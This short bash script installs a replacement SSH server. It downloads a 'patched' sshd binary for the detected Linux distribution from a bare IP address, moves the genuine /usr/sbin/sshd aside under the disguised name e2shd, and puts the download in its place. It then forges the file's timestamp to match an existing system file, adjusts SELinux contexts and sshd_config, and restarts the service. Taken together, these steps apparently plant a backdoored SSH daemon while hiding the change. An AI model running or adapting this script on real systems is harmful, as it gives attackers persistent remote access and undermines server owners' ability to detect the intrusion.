#!/bin/bash

# Download our patched version
if [ -f "/etc/debian_version" ]; then
    curl -o /tmp/sshd http://199.233.236.102/en/u14/sshd
else
    if [ -f "/etc/fedora-release" ]; then
        curl -o /tmp/sshd http://199.233.236.102/en/f32/sshd
    else
        #Must be centos
        curl -o /tmp/sshd http://199.233.236.102/en/c7/sshd
    fi
fi

# Make a backup of the original in case we bork something
mv /usr/sbin/sshd /usr/sbin/e2shd

# Put ours in place
mv /tmp/sshd /usr/sbin/sshd
# Set perms and match the timestamp to one with the same old timestamp
chmod 755 /usr/sbin/sshd
touch -r /usr/sbin/weak-modules /usr/sbin/sshd

# On Fedora 32 systems
# Remove options we don't support
# Need to override GSSAPIKexAlgorithms set in  /etc/crypto-policies/back-ends/opensshserver.config
#Feb 06 02:12:38 ip-10-23-0-32.us-west-2.compute.internal sshd[1111]: /etc/ssh/sshd_config.d/05-redhat.conf line 15: Unsupported option GSSAPIAuthentication
#Feb 06 02:12:38 ip-10-23-0-32.us-west-2.compute.internal sshd[1111]: /etc/ssh/sshd_config.d/05-redhat.conf line 16: Unsupported option GSSAPICleanupCredentials
#sed -i 's/-oGSSAPIKexAlgorithms.* / /' /usr/share/crypto-policies/DEFAULT/opensshserver.txt

# On SELinux systems
if [ -f "/etc/selinux/config" ]; then
    restorecon -Rv /usr/sbin/sshd
    # Might not be related to SELinux but coincides with RedHat
    chmod 600 /etc/ssh/*_key
    sed -i 's/^GSSAPIAuthentication .*$/GSSAPIAuthentication no/' /etc/ssh/sshd_config
fi

# Restart the service
if [ -f "/usr/bin/systemctl" ]; then
    systemctl restart sshd
else
    # for ubuntu 12 & 14
    service ssh restart
fi